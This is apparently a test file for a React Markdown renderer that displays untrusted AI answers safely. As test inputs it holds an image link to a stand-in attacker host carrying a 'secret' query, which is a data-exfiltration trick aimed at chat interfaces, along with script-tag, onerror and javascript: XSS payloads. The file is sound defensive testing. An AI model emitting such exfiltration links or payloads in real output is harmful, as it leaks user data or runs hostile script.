import { render } from "@testing-library/react";

import { Markdown, safeHref } from "./Markdown";

describe("an answer is untrusted (W5)", () => {
  it("shows an image an answer names as a link, never fetching it", () => {
    const { container } = render(
      <Markdown text="Look: ![the chat](https://attacker.example/x.png?q=secret)" />,
    );
    expect(container.querySelector("img")).toBeNull();
    const link = container.querySelector("a")!;
    expect(link.getAttribute("href")).toBe("https://attacker.example/x.png?q=secret");
    expect(link.textContent).toBe("[Image: the chat]");
    expect(link.getAttribute("rel")).toBe("noopener noreferrer");
  });

  it("renders raw HTML in an answer as nothing that runs", () => {
    const { container } = render(
      <Markdown text={'Hi <img src=x onerror="alert(1)"> <script>alert(2)</script> <b>bold</b>'} />,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("b")).toBeNull();
    expect(container.innerHTML).not.toContain("onerror");
  });

  it("makes only web and mail addresses into links", () => {
    expect(safeHref("javascript:alert(1)")).toBeNull();
    expect(safeHref(" JavaScript:alert(1)")).toBeNull();
    expect(safeHref("data:text/html,<b>")).toBeNull();
    expect(safeHref("https://example.org")).toBe("https://example.org");
    expect(safeHref("mailto:a@example.org")).toBe("mailto:a@example.org");
    const { container } = render(<Markdown text="[click](javascript:alert(1))" />);
    expect(container.querySelector("a")).toBeNull();
    expect(container.textContent).toContain("click");
  });

  it("opens every link in a new tab with no opener", () => {
    const { container } = render(<Markdown text="See [the docs](https://example.org/docs)." />);
    const link = container.querySelector("a")!;
    expect(link.getAttribute("target")).toBe("_blank");
    expect(link.getAttribute("rel")).toBe("noopener noreferrer");
  });

  it("gives a code block a copy button", () => {
    const { getByRole } = render(<Markdown text={"```py\nprint(1)\n```"} />);
    expect(getByRole("button", { name: "Copy code" })).toBeInTheDocument();
  });
});
